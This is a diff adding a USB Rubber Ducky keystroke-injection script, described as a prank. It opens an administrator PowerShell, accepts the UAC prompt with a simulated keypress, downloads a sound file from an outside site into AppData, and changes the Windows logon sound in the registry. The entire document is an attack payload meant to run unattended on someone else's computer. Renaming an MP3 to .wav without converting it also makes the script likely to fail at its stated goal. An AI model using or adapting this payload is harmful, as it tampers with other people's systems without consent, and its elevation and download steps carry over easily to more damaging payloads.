@@ -1,0 +1,37 @@
+REM Rubber Ducky Payload to set a custom logon sound in Windows
+REM Save the file in the AppData folder of the user
+
+DELAY 2000
+REM Step 1: Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs"
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+
+REM Step 2: Download the MP3 file to AppData
+STRING $mp3Path = \"$Env:APPDATA\prank_logon.mp3\"
+ENTER
+DELAY 500
+STRING $wavPath = \"$Env:APPDATA\prank_logon.wav\"
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri 'https://www.myinstants.com/media/sounds/dry-fart.mp3' -OutFile $mp3Path
+ENTER
+DELAY 5000
+
+REM Step 3: Rename the MP3 file to WAV in AppData
+STRING Rename-Item -Path $mp3Path -NewName $wavPath
+ENTER
+DELAY 1000
+
+REM Step 4: Update the registry to set the new logon sound
+STRING Set-ItemProperty -Path 'HKCU:\AppEvents\Schemes\Apps\.Default\WindowsLogon\.Current' -Name '(Default)' -Value $wavPath
+ENTER
+DELAY 2000
+
+REM Step 5: Exit PowerShell
+STRING exit
+ENTER
